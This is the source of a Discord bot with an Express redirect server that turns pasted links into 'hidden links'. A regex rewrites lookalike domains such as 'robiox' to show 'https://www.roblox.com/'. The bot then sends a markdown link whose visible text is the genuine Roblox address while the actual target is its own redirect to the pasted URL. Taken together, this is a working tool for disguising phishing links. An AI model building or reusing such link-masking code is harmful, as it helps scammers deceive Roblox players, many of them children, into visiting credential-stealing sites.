require('dotenv').config();

const { Client, GatewayIntentBits, ActionRowBuilder, ModalBuilder, TextInputBuilder, TextInputStyle, MessageFlags } = require('discord.js');
const express = require('express');
const app = express();

const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages] });
const linksDb = {};

// Очень быстрый веб-сервер
app.get('/', (req, res) => res.send('ok'));
app.get('/ping', (req, res) => res.send('ok'));

app.get('/r/:id', (req, res) => {
    if (linksDb[req.params.id]) return res.redirect(linksDb[req.params.id]);
    res.status(404).send('Not found');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Server on ${PORT}`));

// BOT
client.once('ready', () => console.log(`✅ Bot ${client.user.tag} ready!`));

client.on('interactionCreate', async (interaction) => {
    console.log(`🟢 [${new Date().toISOString()}] Interaction ${interaction.type} | ${interaction.customId}`);

    if (interaction.isButton() && interaction.customId === 'create_hyperlink') {
        console.log(`🟢 Button pressed by ${interaction.user.tag}`);

        try {
            const modal = new ModalBuilder()
                .setCustomId('link_modal')
                .setTitle('Create Hidden Link');

            const input = new TextInputBuilder()
                .setCustomId('url_input')
                .setLabel('Paste Roblox link')
                .setStyle(TextInputStyle.Short)
                .setPlaceholder('https://www.roblox.com/...')
                .setRequired(true);

            modal.addComponents(new ActionRowBuilder().addComponents(input));

            await interaction.showModal(modal);
            console.log(`✅ Modal shown`);
        } catch (e) {
            console.error(`❌ Error:`, e.message);
        }
        return;
    }

    if (interaction.isModalSubmit() && interaction.customId === 'link_modal') {
        // ... твоя обработка модалки (оставил как было раньше)
        try {
            const url = interaction.fields.getTextInputValue('url_input');
            const id = Math.random().toString(36).substring(7);
            linksDb[id] = url;

            const shortUrl = `${process.env.BASE_URL}/r/${id}`;
            const visualUrl = url.replace(/https?:\/\/(robiox|roblox)[a-z0-9.-]+(\/|$)/i, 'https://www.roblox.com/').replace('https://', 'https_:_//');

            await interaction.reply({ content: '<a:verify:1513286049638518824> Check your DMs!', flags: [MessageFlags.Ephemeral] });

            await interaction.user.send({
                embeds: [{ color: 0x274666, title: '🔗 Hyperlink Generated', description: '👇Your link is ready!' }]
            });

            await interaction.user.send({ content: `[\`${visualUrl}\`](${shortUrl})` });
        } catch (e) {}
    }
});

client.login(process.env.TOKEN);
